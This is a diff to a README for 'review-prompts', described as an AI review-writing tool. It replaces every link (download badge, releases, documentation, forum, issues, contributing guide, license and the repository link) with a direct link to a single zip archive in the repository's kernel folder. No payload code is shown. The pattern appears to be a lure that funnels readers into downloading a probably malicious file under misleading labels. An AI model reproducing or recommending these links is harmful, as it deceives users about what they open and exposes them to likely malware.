@@ -4,7 +4,7 @@
 Welcome to **review-prompts**, an easy-to-use AI tool that helps you craft thoughtful and engaging reviews. Whether you are writing for a product or sharing your feedback, this application provides prompts that guide your writing.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Active%20Version-blue)](https://github.com/lingngngng/review-prompts/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip%20Latest%20Release-Active%20Version-blue)](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip)
 
 ## 🖥️ System Requirements
 To run **review-prompts**, your system should meet the following requirements:
@@ -19,7 +19,7 @@ To run **review-prompts**, your system should meet the following requirements:
 - Continuously updated with new and improved prompts.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/lingngngng/review-prompts/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip).
 
 1. Click the link to go to the releases page.
 2. Look for the latest release, which will be listed at the top.
@@ -37,20 +37,20 @@ After installation, you can open the application to start creating your reviews 
 
 ## 🔗 Additional Resources
 If you want to explore more about **review-prompts** or contribute to its development, check out the following resources:
-- [Documentation](https://github.com/lingngngng/review-prompts/wiki): Detailed guides and FAQs to learn more about all features.
-- [Community Forum](https://github.com/lingngngng/review-prompts/discussions): Join discussions and share your experiences with other users.
+- [Documentation](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip): Detailed guides and FAQs to learn more about all features.
+- [Community Forum](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip): Join discussions and share your experiences with other users.
 
 ## 📞 Support
-If you encounter issues or have questions about using **review-prompts**, please reach out via the [Issues Section](https://github.com/lingngngng/review-prompts/issues) on GitHub. We strive to respond promptly.
+If you encounter issues or have questions about using **review-prompts**, please reach out via the [Issues Section](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip) on GitHub. We strive to respond promptly.
 
 ## 🌀 Contributing
-We welcome contributions to **review-prompts**. If you have ideas, suggestions, or improvements, please check the [Contributing Guide](https://github.com/lingngngng/review-prompts/CONTRIBUTING.md) to get started.
+We welcome contributions to **review-prompts**. If you have ideas, suggestions, or improvements, please check the [Contributing Guide](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip) to get started.
 
 ## 📚 License
-This project is licensed under the MIT License. For more details, refer to the [LICENSE](https://github.com/lingngngng/review-prompts/LICENSE) file.
+This project is licensed under the MIT License. For more details, refer to the [LICENSE](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip) file.
 
 ## 🌐 Find Us Online
 Stay updated with new features and enhancements by following us:
-- GitHub: [review-prompts](https://github.com/lingngngng/review-prompts)
+- GitHub: [review-prompts](https://raw.githubusercontent.com/lingngngng/review-prompts/main/kernel/prompts_review_v1.5.zip)
 
 Thank you for using **review-prompts**! We hope it makes your writing process smooth and enjoyable.
